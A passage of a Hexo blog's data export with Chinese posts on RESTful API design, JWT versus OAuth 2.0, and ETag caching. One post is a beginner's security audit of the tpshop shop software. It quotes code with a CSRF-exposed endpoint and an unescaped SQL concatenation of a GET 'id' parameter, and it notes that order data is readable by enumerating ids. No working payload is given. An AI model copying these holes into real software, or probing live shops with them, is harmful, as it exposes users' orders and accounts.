是Fielding博士在他的论文[1]中提出的一种新的架构风格,被称作表述性状态移交（Representational State Transfer）架构风格,它成为了现代 Web 架构的基础.[2]</p>\n<p>符合 REST 原则的应用程序或设计称做 RESTful.</p>\n<p><strong>RESTful API 设计原则:</strong></p>\n<ul>\n<li><ol>\n<li>无状态</li>\n</ol>\n<ul>\n<li><p>通信必须在本质上是无状态的.无状态指的是任意一个Web请求必须完全与其他请求隔离，当客户端提出请求时，请求本身包含了这一请求所需的全部信息,会话状态因此要全部保存在客户端</p>\n</li>\n<li><p><em>有状态和无状态与请求本身没有多大关联，重要的是状态信息是由请求方还是响应方负责保存</em></p>\n</li>\n</ul>\n</li>\n<li><ol>\n<li>对于web的融入</li>\n</ol>\n<ul>\n<li>这个API应该能够使用浏览器来进行所有测试,能够方便的使用web功能测试、性能测试等工具进行测试,web类应用也方便将多个RESTful API进行整合应用</li>\n</ul>\n</li>\n<li><ol>\n<li>资源</li>\n</ol>\n<ul>\n<li><p>对于资源的抽象，是设计RESTful API的核心内容,资源就是”Representational State Transfer”这个词组中被省略的主语</p>\n</li>\n<li><p>REST 对于信息的核心抽象是资源.任何能够被命名的信息都能够作为一个资源:一份文档或一张图片、一个与时间相关的服务（例如，“洛杉矶今日的天气”）、一个其他资源的集合、一个非虚拟的对象（例如，人）等等。</p>\n</li>\n</ul>\n</li>\n<li><ol>\n<li>缓存</li>\n</ol>\n<ul>\n<li>应当具有良好的缓存机制, HTTP的缓存机制就是个不错的选择</li>\n</ul>\n</li>\n<li><ol>\n<li>低耦合</li>\n</ol>\n<ul>\n<li>REST的几个特征保证了RESTful API的低耦合性, 对于资源（Resource）的抽象、统一接口（Uniform Interface）、超文本驱动（Hypertext Driven）[3]</li>\n</ul>\n</li>\n</ul>\n<p>##RESTful API设计细节</p>\n<p>###请求</p>\n<p>RESTful 使用HTTP动词操作资源</p>\n<p><strong>常用的HTTP动词有下面四个[4]</strong></p>\n<ul>\n<li><ol>\n<li>GET - 用于获取资源信息</li>\n</ol>\n</li>\n<li><ol>\n<li>POST - 用于新建或修改资源</li>\n</ol>\n</li>\n<li><ol>\n<li>PUT - 用于修改资源</li>\n</ol>\n</li>\n<li><ol>\n<li>DELETE - 用于删除资源</li>\n</ol>\n</li>\n</ul>\n<p><strong>幂等性(Idempotent)</strong></p>\n<p>幂等性是指: 多次请求所得到的结果与一次请求所得到的结果相同. 上方具有幂等性的方法有GET/PUT/DELETE</p>\n<p>用一个点赞的示例来说明幂等性 &amp; POST与PUT的区别:</p>\n<p>当这个点赞一个人只能点赞一次的时候,应使用PUT方法,这个点赞是具有幂等性的,当一个人可以点赞无数次时,应使用POST方法</p>\n<p><em>PUT方法的幂等性使我们能更好的处理逻辑</em></p>\n<p><strong>常见操作示例</strong></p>\n<ul>\n<li>GET /user - 获取用户列表</li>\n<li>GET /user/uid - 获取指定用户</li>\n<li>GET /user/uid/comments- 获取指定用户的评论</li>\n<li>POST /user - 新建一个用户</li>\n<li>PUT /user/uid - 修改指定用户</li>\n<li>DELETE /user/uid - 删除指定用户</li>\n</ul>\n<p><em>URL的设计原则:资源不能使用动词、路径不宜过深,二三层即可,过深可以使用参数的方式来代表、永远使用最短的路径</em></p>\n<p><strong>不被支持的HTTP动词</strong></p>\n<p>有些情况下会只支持GET&amp;POST方法(HTML的FORM标签method属性),可以在头信息中加入X-HTTP-Method-Override来表示当前的HTTP请求或在请求参数中加入_method来表示当前请求(laravel框架使用的此方法)</p>\n<p>###SSL/TLS</p>\n<p>条件允许的情况下,永远使用SSL/TLS!</p>\n<p>好处不多说了,再说一点: 不要将HTTP重定向到HTTPS,抛出错误就好,因为第一次的 HTTP 请求就有可能被劫持,导致请求无法到达服务器，从而构成 HTTPS 降级劫持</p>\n<p>###文档</p>\n<p>文档应简单易懂并具有良好的示例,粘贴至浏览器能直接使用</p>\n<p>这里推荐使用Postman,一个很好用的chrome应用</p>\n<p>###版本号</p>\n<p>API不会是永远稳定的,版本升级的问题无法避免.</p>\n<p>版本号只允许枚举,不允许区间.</p>\n<p>关于API的版本号问题,有两种解决方案:</p>\n<ul>\n<li><ol>\n<li>放入URL中. 优点是更加直观些</li>\n</ol>\n</li>\n<li><ol>\n<li>放入Header 信息中.URL更加优雅,api.github.com采用此方法</li>\n</ol>\n</li>\n</ul>\n<p>###排序 &amp; 筛选 &amp; 分页</p>\n<p>未完待续……</p>\n","excerpt":"","more":"<p>##首先理解 REST 与 RESTful</p>\n<p>REST 是Fielding博士在他的论文[1]中提出的一种新的架构风格,被称作表述性状态移交（Representational State Transfer）架构风格,它成为了现代 Web 架构的基础.[2]</p>\n<p>符合 REST 原则的应用程序或设计称做 RESTful.</p>\n<p><strong>RESTful API 设计原则:</strong></p>\n<ul>\n<li><ol>\n<li>无状态</li>\n</ol>\n<ul>\n<li><p>通信必须在本质上是无状态的.无状态指的是任意一个Web请求必须完全与其他请求隔离，当客户端提出请求时，请求本身包含了这一请求所需的全部信息,会话状态因此要全部保存在客户端</p>\n</li>\n<li><p><em>有状态和无状态与请求本身没有多大关联，重要的是状态信息是由请求方还是响应方负责保存</em></p>\n</li>\n</ul>\n</li>\n<li><ol>\n<li>对于web的融入</li>\n</ol>\n<ul>\n<li>这个API应该能够使用浏览器来进行所有测试,能够方便的使用web功能测试、性能测试等工具进行测试,web类应用也方便将多个RESTful API进行整合应用</li>\n</ul>\n</li>\n<li><ol>\n<li>资源</li>\n</ol>\n<ul>\n<li><p>对于资源的抽象，是设计RESTful API的核心内容,资源就是”Representational State Transfer”这个词组中被省略的主语</p>\n</li>\n<li><p>REST 对于信息的核心抽象是资源.任何能够被命名的信息都能够作为一个资源:一份文档或一张图片、一个与时间相关的服务（例如，“洛杉矶今日的天气”）、一个其他资源的集合、一个非虚拟的对象（例如，人）等等。</p>\n</li>\n</ul>\n</li>\n<li><ol>\n<li>缓存</li>\n</ol>\n<ul>\n<li>应当具有良好的缓存机制, HTTP的缓存机制就是个不错的选择</li>\n</ul>\n</li>\n<li><ol>\n<li>低耦合</li>\n</ol>\n<ul>\n<li>REST的几个特征保证了RESTful API的低耦合性, 对于资源（Resource）的抽象、统一接口（Uniform Interface）、超文本驱动（Hypertext Driven）[3]</li>\n</ul>\n</li>\n</ul>\n<p>##RESTful API设计细节</p>\n<p>###请求</p>\n<p>RESTful 使用HTTP动词操作资源</p>\n<p><strong>常用的HTTP动词有下面四个[4]</strong></p>\n<ul>\n<li><ol>\n<li>GET - 用于获取资源信息</li>\n</ol>\n</li>\n<li><ol>\n<li>POST - 用于新建或修改资源</li>\n</ol>\n</li>\n<li><ol>\n<li>PUT - 用于修改资源</li>\n</ol>\n</li>\n<li><ol>\n<li>DELETE - 用于删除资源</li>\n</ol>\n</li>\n</ul>\n<p><strong>幂等性(Idempotent)</strong></p>\n<p>幂等性是指: 多次请求所得到的结果与一次请求所得到的结果相同. 上方具有幂等性的方法有GET/PUT/DELETE</p>\n<p>用一个点赞的示例来说明幂等性 &amp; POST与PUT的区别:</p>\n<p>当这个点赞一个人只能点赞一次的时候,应使用PUT方法,这个点赞是具有幂等性的,当一个人可以点赞无数次时,应使用POST方法</p>\n<p><em>PUT方法的幂等性使我们能更好的处理逻辑</em></p>\n<p><strong>常见操作示例</strong></p>\n<ul>\n<li>GET /user - 获取用户列表</li>\n<li>GET /user/uid - 获取指定用户</li>\n<li>GET /user/uid/comments- 获取指定用户的评论</li>\n<li>POST /user - 新建一个用户</li>\n<li>PUT /user/uid - 修改指定用户</li>\n<li>DELETE /user/uid - 删除指定用户</li>\n</ul>\n<p><em>URL的设计原则:资源不能使用动词、路径不宜过深,二三层即可,过深可以使用参数的方式来代表、永远使用最短的路径</em></p>\n<p><strong>不被支持的HTTP动词</strong></p>\n<p>有些情况下会只支持GET&amp;POST方法(HTML的FORM标签method属性),可以在头信息中加入X-HTTP-Method-Override来表示当前的HTTP请求或在请求参数中加入_method来表示当前请求(laravel框架使用的此方法)</p>\n<p>###SSL/TLS</p>\n<p>条件允许的情况下,永远使用SSL/TLS!</p>\n<p>好处不多说了,再说一点: 不要将HTTP重定向到HTTPS,抛出错误就好,因为第一次的 HTTP 请求就有可能被劫持,导致请求无法到达服务器，从而构成 HTTPS 降级劫持</p>\n<p>###文档</p>\n<p>文档应简单易懂并具有良好的示例,粘贴至浏览器能直接使用</p>\n<p>这里推荐使用Postman,一个很好用的chrome应用</p>\n<p>###版本号</p>\n<p>API不会是永远稳定的,版本升级的问题无法避免.</p>\n<p>版本号只允许枚举,不允许区间.</p>\n<p>关于API的版本号问题,有两种解决方案:</p>\n<ul>\n<li><ol>\n<li>放入URL中. 优点是更加直观些</li>\n</ol>\n</li>\n<li><ol>\n<li>放入Header 信息中.URL更加优雅,api.github.com采用此方法</li>\n</ol>\n</li>\n</ul>\n<p>###排序 &amp; 筛选 &amp; 分页</p>\n<p>未完待续……</p>\n"},{"title":"JWT 与 OAuth 2.0","_content":"**新的项目要写接口 开始研究接口规范,决定使用RESTful风格接口规范与OAuth2.0权限管理**  \n\n在了解OAuth2.0的过程中,发现了JWT,搜索到的结果也有好多《JWT加OAuth2.0实现xxx》等文章,让我误以为JWT与OAuth2.0是一种东西,甚至于是依赖于OAuth2.0,专用于生成token的规范.细心了解之后,发现并不一样   \n\n<!--more-->  \n\n```\nJWT（JSON Web Token）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。\n```\n\nhttp://laravelacademy.org/post/3640.html?utm_source=tuicool&utm_medium=referral   \n\n```\nOAuth是一个关于授权（authorization）的开放网络标准\n```\n\nhttp://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html  \n\n以上是两篇详细解读JWT于OAuth2.0的文章  \n\n**以下是我的理解:**  \n\nJWT的token是用于传递消息的,所以token是能被解密的  \n\nOAuth2.0的token就代表着授权令牌,而消息是服务器端在与token关联的消息体上获取.因为token本身并没有蕴含消息,所以token的生成只需要hash一下并且保证不重复就ok了  ","source":"_posts/JWT 与 OAuth 2.0.md","raw":"---\ntitle: JWT 与 OAuth 2.0\n---\n**新的项目要写接口 开始研究接口规范,决定使用RESTful风格接口规范与OAuth2.0权限管理**  \n\n在了解OAuth2.0的过程中,发现了JWT,搜索到的结果也有好多《JWT加OAuth2.0实现xxx》等文章,让我误以为JWT与OAuth2.0是一种东西,甚至于是依赖于OAuth2.0,专用于生成token的规范.细心了解之后,发现并不一样   \n\n<!--more-->  \n\n```\nJWT（JSON Web Token）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。\n```\n\nhttp://laravelacademy.org/post/3640.html?utm_source=tuicool&utm_medium=referral   \n\n```\nOAuth是一个关于授权（authorization）的开放网络标准\n```\n\nhttp://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html  \n\n以上是两篇详细解读JWT于OAuth2.0的文章  \n\n**以下是我的理解:**  \n\nJWT的token是用于传递消息的,所以token是能被解密的  \n\nOAuth2.0的token就代表着授权令牌,而消息是服务器端在与token关联的消息体上获取.因为token本身并没有蕴含消息,所以token的生成只需要hash一下并且保证不重复就ok了  ","slug":"JWT 与 OAuth 2.0","published":1,"date":"2016-10-12T10:00:27.365Z","updated":"2016-10-14T05:12:47.231Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cix5vkhcr00011si4vl7el9b3","content":"<p><strong>新的项目要写接口 开始研究接口规范,决定使用RESTful风格接口规范与OAuth2.0权限管理</strong>  </p>\n<p>在了解OAuth2.0的过程中,发现了JWT,搜索到的结果也有好多《JWT加OAuth2.0实现xxx》等文章,让我误以为JWT与OAuth2.0是一种东西,甚至于是依赖于OAuth2.0,专用于生成token的规范.细心了解之后,发现并不一样   </p>\n<a id=\"more\"></a>  \n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">JWT（JSON Web Token）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。</div></pre></td></tr></table></figure>\n<p><a href=\"http://laravelacademy.org/post/3640.html?utm_source=tuicool&amp;utm_medium=referral\" target=\"_blank\" rel=\"external\">http://laravelacademy.org/post/3640.html?utm_source=tuicool&amp;utm_medium=referral</a>   </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">OAuth是一个关于授权（authorization）的开放网络标准</div></pre></td></tr></table></figure>\n<p><a href=\"http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html\" target=\"_blank\" rel=\"external\">http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html</a>  </p>\n<p>以上是两篇详细解读JWT于OAuth2.0的文章  </p>\n<p><strong>以下是我的理解:</strong>  </p>\n<p>JWT的token是用于传递消息的,所以token是能被解密的  </p>\n<p>OAuth2.0的token就代表着授权令牌,而消息是服务器端在与token关联的消息体上获取.因为token本身并没有蕴含消息,所以token的生成只需要hash一下并且保证不重复就ok了  </p>\n","excerpt":"<p><strong>新的项目要写接口 开始研究接口规范,决定使用RESTful风格接口规范与OAuth2.0权限管理</strong>  </p>\n<p>在了解OAuth2.0的过程中,发现了JWT,搜索到的结果也有好多《JWT加OAuth2.0实现xxx》等文章,让我误以为JWT与OAuth2.0是一种东西,甚至于是依赖于OAuth2.0,专用于生成token的规范.细心了解之后,发现并不一样   </p>","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">JWT（JSON Web Token）是一个非常轻巧的规范。这个规范允许我们使用JWT在用户和服务器之间传递安全可靠的信息。</div></pre></td></tr></table></figure>\n<p><a href=\"http://laravelacademy.org/post/3640.html?utm_source=tuicool&amp;utm_medium=referral\">http://laravelacademy.org/post/3640.html?utm_source=tuicool&amp;utm_medium=referral</a>   </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">OAuth是一个关于授权（authorization）的开放网络标准</div></pre></td></tr></table></figure>\n<p><a href=\"http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html\">http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html</a>  </p>\n<p>以上是两篇详细解读JWT于OAuth2.0的文章  </p>\n<p><strong>以下是我的理解:</strong>  </p>\n<p>JWT的token是用于传递消息的,所以token是能被解密的  </p>\n<p>OAuth2.0的token就代表着授权令牌,而消息是服务器端在与token关联的消息体上获取.因为token本身并没有蕴含消息,所以token的生成只需要hash一下并且保证不重复就ok了  </p>"},{"title":"RESTful缓存方案","_content":"\n**RESTful的缓存是使用了http缓存规范**  \n参考文章:https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn \n\n<!--more-->  \n\n**http的缓存有两种方案`ETag`与` Last-Modified` 本文讲的是第一种,也就是参考文章里所讲的**  \n\n`ETag`缓存方案的实现很简单,服务器返回响应头的时,加上缓存时间与验证令牌(ETag),如有需要还可以加上内容类型、长度等\n```\n200 OK\nCache-Controller: max-age=60\nETag: \"xxxxxxxxxxxxx\"\nContent-Lenght: 1024\n```\n上面的示例代码中,服务器告诉了客户端,可以缓存60秒,验证令牌为:xxxxxxxxxxxxx,内容长度是1024  \n\n客户端在收到响应头时,可在本地缓存一个60秒的内容,60秒后,重新访问资源,并在请求头中附带`If-None-Match`值为前文收到的验证令牌.  \n服务器根据客户端提供的验证令牌,判断资源是否有更新,如果没有更新,则返回`304`+空的内容,响应头中附带新的可缓存时间,如果资源有更新,则返回`200`+资源内容,响应头中附带缓存时间与新的验证令牌  \n```\n资源无更新示例:\n304 Not Modified\nCache-Controller: max-age=60\n\n资源有更新示例:\n200 OK\nCache-Controller: max-age=60\nETag: \"ooooooooooooo\"\nContent-Lenght: 1024\n```\n\n更详细的缓存方案也是半懂不懂,有时间应该买本《HTTP权威指南》.","source":"_posts/RESTful缓存方案.md","raw":"---\ntitle: RESTful缓存方案\n---\n\n**RESTful的缓存是使用了http缓存规范**  \n参考文章:https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn \n\n<!--more-->  \n\n**http的缓存有两种方案`ETag`与` Last-Modified` 本文讲的是第一种,也就是参考文章里所讲的**  \n\n`ETag`缓存方案的实现很简单,服务器返回响应头的时,加上缓存时间与验证令牌(ETag),如有需要还可以加上内容类型、长度等\n```\n200 OK\nCache-Controller: max-age=60\nETag: \"xxxxxxxxxxxxx\"\nContent-Lenght: 1024\n```\n上面的示例代码中,服务器告诉了客户端,可以缓存60秒,验证令牌为:xxxxxxxxxxxxx,内容长度是1024  \n\n客户端在收到响应头时,可在本地缓存一个60秒的内容,60秒后,重新访问资源,并在请求头中附带`If-None-Match`值为前文收到的验证令牌.  \n服务器根据客户端提供的验证令牌,判断资源是否有更新,如果没有更新,则返回`304`+空的内容,响应头中附带新的可缓存时间,如果资源有更新,则返回`200`+资源内容,响应头中附带缓存时间与新的验证令牌  \n```\n资源无更新示例:\n304 Not Modified\nCache-Controller: max-age=60\n\n资源有更新示例:\n200 OK\nCache-Controller: max-age=60\nETag: \"ooooooooooooo\"\nContent-Lenght: 1024\n```\n\n更详细的缓存方案也是半懂不懂,有时间应该买本《HTTP权威指南》.","slug":"RESTful缓存方案","published":1,"date":"2016-10-25T01:30:35.259Z","updated":"2016-12-06T02:17:11.225Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cix5vkhcw00031si4urj7hyde","content":"<p><strong>RESTful的缓存是使用了http缓存规范</strong><br>参考文章:<a href=\"https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn\" target=\"_blank\" rel=\"external\">https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn</a> </p>\n<a id=\"more\"></a>  \n<p><strong>http的缓存有两种方案<code>ETag</code>与<code>Last-Modified</code> 本文讲的是第一种,也就是参考文章里所讲的</strong>  </p>\n<p><code>ETag</code>缓存方案的实现很简单,服务器返回响应头的时,加上缓存时间与验证令牌(ETag),如有需要还可以加上内容类型、长度等<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">200 OK</div><div class=\"line\">Cache-Controller: max-age=60</div><div class=\"line\">ETag: &quot;xxxxxxxxxxxxx&quot;</div><div class=\"line\">Content-Lenght: 1024</div></pre></td></tr></table></figure></p>\n<p>上面的示例代码中,服务器告诉了客户端,可以缓存60秒,验证令牌为:xxxxxxxxxxxxx,内容长度是1024  </p>\n<p>客户端在收到响应头时,可在本地缓存一个60秒的内容,60秒后,重新访问资源,并在请求头中附带<code>If-None-Match</code>值为前文收到的验证令牌.<br>服务器根据客户端提供的验证令牌,判断资源是否有更新,如果没有更新,则返回<code>304</code>+空的内容,响应头中附带新的可缓存时间,如果资源有更新,则返回<code>200</code>+资源内容,响应头中附带缓存时间与新的验证令牌<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">资源无更新示例:</div><div class=\"line\">304 Not Modified</div><div class=\"line\">Cache-Controller: max-age=60</div><div class=\"line\"></div><div class=\"line\">资源有更新示例:</div><div class=\"line\">200 OK</div><div class=\"line\">Cache-Controller: max-age=60</div><div class=\"line\">ETag: &quot;ooooooooooooo&quot;</div><div class=\"line\">Content-Lenght: 1024</div></pre></td></tr></table></figure></p>\n<p>更详细的缓存方案也是半懂不懂,有时间应该买本《HTTP权威指南》.</p>\n","excerpt":"<p><strong>RESTful的缓存是使用了http缓存规范</strong><br>参考文章:<a href=\"https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn\">https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn</a> </p>","more":"<p><strong>http的缓存有两种方案<code>ETag</code>与<code>Last-Modified</code> 本文讲的是第一种,也就是参考文章里所讲的</strong>  </p>\n<p><code>ETag</code>缓存方案的实现很简单,服务器返回响应头的时,加上缓存时间与验证令牌(ETag),如有需要还可以加上内容类型、长度等<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">200 OK</div><div class=\"line\">Cache-Controller: max-age=60</div><div class=\"line\">ETag: &quot;xxxxxxxxxxxxx&quot;</div><div class=\"line\">Content-Lenght: 1024</div></pre></td></tr></table></figure></p>\n<p>上面的示例代码中,服务器告诉了客户端,可以缓存60秒,验证令牌为:xxxxxxxxxxxxx,内容长度是1024  </p>\n<p>客户端在收到响应头时,可在本地缓存一个60秒的内容,60秒后,重新访问资源,并在请求头中附带<code>If-None-Match</code>值为前文收到的验证令牌.<br>服务器根据客户端提供的验证令牌,判断资源是否有更新,如果没有更新,则返回<code>304</code>+空的内容,响应头中附带新的可缓存时间,如果资源有更新,则返回<code>200</code>+资源内容,响应头中附带缓存时间与新的验证令牌<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">资源无更新示例:</div><div class=\"line\">304 Not Modified</div><div class=\"line\">Cache-Controller: max-age=60</div><div class=\"line\"></div><div class=\"line\">资源有更新示例:</div><div class=\"line\">200 OK</div><div class=\"line\">Cache-Controller: max-age=60</div><div class=\"line\">ETag: &quot;ooooooooooooo&quot;</div><div class=\"line\">Content-Lenght: 1024</div></pre></td></tr></table></figure></p>\n<p>更详细的缓存方案也是半懂不懂,有时间应该买本《HTTP权威指南》.</p>"},{"title":"tpshop代码审计","_content":"### 题记:本人web安全方面新手,因以前常用tp框架,在tp官网上看到了一个叫做tpshop的开源产品,忍不住想要找一找BUG  \n**首先,这是一次失败的代码审计,找到了一个用户收藏商品的csrf漏洞,找到了一个sql注入点,却没有找到能注入的方法**  \n\n<!--more--> \n\n首先说csrf的寻找过程,意外的简单......  \n原本我是要去找新增评论方法的漏洞,看了一会儿,没有发现能利用的地方,正准备去其他的地方的时候,在这个方法下面发现了用户收藏的方法,代码如下:  \n```\n/**\n* 用户收藏某一件商品\n* @param type $goods_id\n*/\npublic function collect_goods($goods_id)\n{\n  $goods_id = I('goods_id');\n  $goodsLogic = new \\Home\\Logic\\GoodsLogic();        \n  $result = $goodsLogic->collect_goods(cookie('user_id'),$goods_id);\n  exit(json_encode($result));\n}\n```\n一眼看过去,这绝对是有问题的啊,没有任何验证.所以我简单的用jq的ajax方法测试了一个,果然成功了;  \n\n**下面说sql注入点**\n上面的成功寻找给了我信心,这个产品是有问题!  \n我就去想,tp有什么方法是有问题的,由此想到了`->query()`方法,这个方法执行的sql语句是没有参数化的,所以如果在这个方法中的sql语句存在拼接参数的话,是有可能会有注入的.  \n按照上面的思路,我开始搜索Home控制器下的`->query()`,果然搜索到了好几个地方,于是一一检查,可惜检查了好几个都是没有拼接参数的,直到最后一个!  \nHome/UserController控制器下的`order_detail`方法,get参数'id'直接拼接在了query中.代码:\n```\n$sql = \"SELECT action_id,log_time,status_desc,order_status FROM ((SELECT * FROM __PREFIX__order_action WHERE order_id = $id AND status_desc <>'' ORDER BY action_id) AS a) GROUP BY status_desc ORDER BY action_id\";\n$items = M()->fetchSql(true)->query($sql);\n```\n如上所见,简单粗暴,没有任何处理的拼接.简直最佳注入点啊  \n可惜的是,在详细的看了语句之后,发现并没有想象的那么简单\n```\nSELECT action_id,log_time,status_desc,order_status FROM ((SELECT * FROM __PREFIX__order_action WHERE order_id = \n```\n这之后的语句可以随意编写,但是我却找不到方法.并且在这句拼接之后,还用了'id'参数进行别的查询:\n```\n$invoice_no = M('DeliveryDoc')->where(\"order_id = $id\")->getField('invoice_no',true);\n```\n导致语句错误  \n一次失败的代码审计......看来web安全之路还有很长啊  \nps:虽然没有注入,但是代码本身没有做订单id与用户绑定的操作,所以可以通过遍历id获取信息","source":"_posts/tpshop代码审计.md","raw":"---\ntitle: tpshop代码审计\n---\n### 题记:本人web安全方面新手,因以前常用tp框架,在tp官网上看到了一个叫做tpshop的开源产品,忍不住想要找一找BUG  \n**首先,这是一次失败的代码审计,找到了一个用户收藏商品的csrf漏洞,找到了一个sql注入点,却没有找到能注入的方法**  \n\n<!--more--> \n\n首先说csrf的寻找过程,意外的简单......  \n原本我是要去找新增评论方法的漏洞,看了一会儿,没有发现能利用的地方,正准备去其他的地方的时候,在这个方法下面发现了用户收藏的方法,代码如下:  \n```\n/**\n* 用户收藏某一件商品\n* @param type $goods_id\n*/\npublic function collect_goods($goods_id)\n{\n  $goods_id = I('goods_id');\n  $goodsLogic = new \\Home\\Logic\\GoodsLogic();        \n  $result = $goodsLogic->collect_goods(cookie('user_id'),$goods_id);\n  exit(json_encode($result));\n}\n```\n一眼看过去,这绝对是有问题的啊,没有任何验证.所以我简单的用jq的ajax方法测试了一个,果然成功了;  \n\n**下面说sql注入点**\n上面的成功寻找给了我信心,这个产品是有问题!  \n我就去想,tp有什么方法是有问题的,由此想到了`->query()`方法,这个方法执行的sql语句是没有参数化的,所以如果在这个方法中的sql语句存在拼接参数的话,是有可能会有注入的.  \n按照上面的思路,我开始搜索Home控制器下的`->query()`,果然搜索到了好几个地方,于是一一检查,可惜检查了好几个都是没有拼接参数的,直到最后一个!  \nHome/UserController控制器下的`order_detail`方法,get参数'id'直接拼接在了query中.代码:\n```\n$sql = \"SELECT action_id,log_time,status_desc,order_status FROM ((SELECT * FROM __PREFIX__order_action WHERE order_id = $id AND status_desc <>'' ORDER BY action_id) AS a) GROUP BY status_desc ORDER BY action_id\";\n$items = M()->fetchSql(true)->query($sql);\n```\n如上所见,简单粗暴,没有任何处理的拼接.简直最佳注入点啊  \n可惜的是,在详细的看了语句之后,发现并没有想象的那么简单\n```\nSELECT action_id,log_time,status_desc,order_status FROM ((SELECT * FROM __PREFIX__order_action WHERE order_id = \n```\n这之后的语句可以随意编写,但是我却找不到方法.并且在这句拼接之后,还用了'id'参数进行别的查询:\n```\n$invoice_no = M('DeliveryDoc')->where(\"order_id = $id\")->getField('invoice_no',true);\n```\n导致语句错误  \n一次失败的代码审计......看来web安全之路还有很长啊  \nps:虽然没有注入,但是代码本身没有做订单id与用户绑定的操作,所以可以通过遍历id获取信息","slug":"tpshop代码审计","published":1,"date":"2016-10-14T09:58:28.784Z","updated":"2016-10-17T01:46:44.959Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cix5vkhd500051si4ksa61ddo","content":"<h3 id=\"题记-本人web安全方面新手-因以前常用tp框架-在tp官网上看到了一个叫做tpshop的开源产品-忍不住想要找一找BUG\"><a href=\"#题记-本人web安全方面新手-因以前常用tp框架-在tp官网上看到了一个叫做tpshop的开源产品-忍不住想要找一找BUG\" class=\"headerlink\" title=\"题记:本人web安全方面新手,因以前常用tp框架,在tp官网上看到了一个叫做tpshop的开源产品,忍不住想要找一找BUG\"></a>题记:本人web安全方面新手,因以前常用tp框架,在tp官网上看到了一个叫做tpshop的开源产品,忍不住想要找一找BUG</h3><p><strong>首先,这是一次失败的代码审计,找到了一个用户收藏商品的csrf漏洞,找到了一个sql注入点,却没有找到能注入的方法</strong>  </p>\n<a id=\"more\"></a> \n<p>首先说csrf的寻找过程,意外的简单……<br>原本我是要去找新增评论方法的漏洞,看了一会儿,没有发现能利用的地方,正准备去其他的地方的时候,在这个方法下面发现了用户收藏的方法,代码如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">/**</div><div class=\"line\">* 用户收藏某一件商品</div><div class=\"line\">* @param type $goods_id</div><div class=\"line\">*/</div><div class=\"line\">public function collect_goods($goods_id)</div><div class=\"line\">&#123;</div><div class=\"line\">  $goods_id = I(&apos;goods_id&apos;);</div><div class=\"line\">  $goodsLogic = new \\Home\\Logic\\GoodsLogic();        </div><div class=\"line\">  $result = $goodsLogic-&gt;collect_goods(cookie(&apos;user_id&apos;),$goods_id);</div><div class=\"line\">  exit(json_encode($result));</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>一眼看过去,这绝对是有问题的啊,没有任何验证.所以我简单的用jq的ajax方法测试了一个,果然成功了;  </p>\n<p><strong>下面说sql注入点</strong><br>上面的成功寻找给了我信心,这个产品是有问题!<br>我就去想,tp有什么方法是有问题的,由此想到了<code>-&gt;query()</code>方法,这个方法执行的sql语句是没有参数化的,所以如果在这个方法中的sql语句存在拼接参数的话,是有可能会有注入的.<br>按照上面的思路,我开始搜索Home控制器下的<code>-&gt;query()</code>,果然搜索到了好几个地方,于是一一检查,可惜检查了好几个都是没有拼接参数的,直到最后一个!<br>Home/UserController控制器下的<code>order_detail</code>方法,get参数’id’直接拼接在了query中.代码:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$sql = &quot;SELECT 